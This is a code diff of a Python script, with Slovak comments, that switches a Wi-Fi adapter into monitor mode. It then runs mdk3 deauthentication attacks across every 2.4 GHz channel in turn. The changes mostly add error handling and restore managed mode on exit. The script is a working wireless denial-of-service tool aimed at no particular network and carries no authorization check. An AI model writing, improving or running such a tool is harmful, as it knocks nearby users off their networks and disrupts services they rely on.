@@ -5,8 +5,8 @@ import sys
 def check_monitor_mode_support(interface):
     """Overí, či zariadenie podporuje monitor mód."""
     try:
-        iwlist_output = subprocess.check_output(['iw', 'list'], text=True)
-        if "monitor" in iwlist_output:
+        iw_output = subprocess.check_output(['iw', 'list'], text=True)
+        if "monitor" in iw_output:
             print(f"[+] Adaptér {interface} podporuje monitor mód.")
             return True
         else:
@@ -18,34 +18,61 @@ def check_monitor_mode_support(interface):
 
 def set_monitor_mode(interface):
     """Nastaví Wi-Fi rozhranie do monitor módu."""
-    print(f"[+] Nastavujem {interface} do monitor módu...")
-    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
-    subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'control'], check=True)
-    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
-    print(f"[+] {interface} je teraz v monitor móde.")
+    try:
+        print(f"[+] Nastavujem {interface} do monitor módu...")
+        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
+        subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'control'], check=True)
+        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
+        print(f"[+] {interface} je teraz v monitor móde.")
+        return True
+    except subprocess.CalledProcessError:
+        print("[!] Nepodarilo sa nastaviť monitor mód.")
+        return False
+
+def set_managed_mode(interface):
+    """Vracia Wi-Fi adaptér späť do managed módu."""
+    try:
+        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
+        subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'], check=True)
+        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
+        print(f"[+] {interface} nastavené späť do managed módu.")
+    except subprocess.CalledProcessError:
+        print("[!] Chyba pri nastavovaní managed módu.")
 
 def set_channel(interface, channel):
     """Nastaví Wi-Fi kanál."""
-    subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], check=True)
+    try:
+        subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', str(channel)], check=True)
+    except subprocess.CalledProcessError:
+        print(f"[!] Nepodarilo sa nastaviť kanál {channel}")
 
 def deauth_on_channel(interface, channel):
     """Spustí deauth útok na danom kanáli pomocou mdk3."""
     print(f"[+] Spúšťam Deauth na kanáli {channel}")
-    command = ['sudo', 'mdk3', interface, 'd', '-c', str(channel)]
-    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(5)
-    process.terminate()
-    process.wait()
+    try:
+        process = subprocess.Popen(['sudo', 'mdk3', interface, 'd', '-c', str(channel)],
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(5)
+        process.terminate()
+        process.wait()
+    except Exception as e:
+        print(f"[!] Chyba pri spustení deauth: {e}")
 
 def main():
     interface = 'wlan1'  # zmeň podľa potreby
 
     if not check_monitor_mode_support(interface):
-        print("[X] Ukončujem skript. Potrebný adaptér s podporou monitor módu.")
-        sys.exit(1)
+        response = input(f"[?] {interface} nepodporuje monitor mód. Chceš ho zapnúť? (Yes/No): ")
+        if response.strip().lower() == 'yes':
+            if not set_monitor_mode(interface):
+                print("[X] Nepodarilo sa zapnúť monitor mód. Ukončujem skript.")
+                sys.exit(1)
+        else:
+            print("[X] Monitor mód je potrebný. Skript končí.")
+            sys.exit(1)
+    else:
+        set_monitor_mode(interface)
 
-    set_monitor_mode(interface)
-    
     channels = range(1, 14)  # 2.4 GHz kanály
 
     try:
@@ -54,11 +81,9 @@ def main():
                 set_channel(interface, channel)
                 deauth_on_channel(interface, channel)
     except KeyboardInterrupt:
-        print("\n[!] Detekované prerušenie používateľom. Ukončujem skript.")
-        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])
-        subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'])
-        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])
-        print(f"[+] {interface} nastavené späť do managed módu.")
+        print("\n[!] Detekované prerušenie používateľom.")
+    finally:
+        set_managed_mode(interface)
 
 if __name__ == "__main__":
     main()
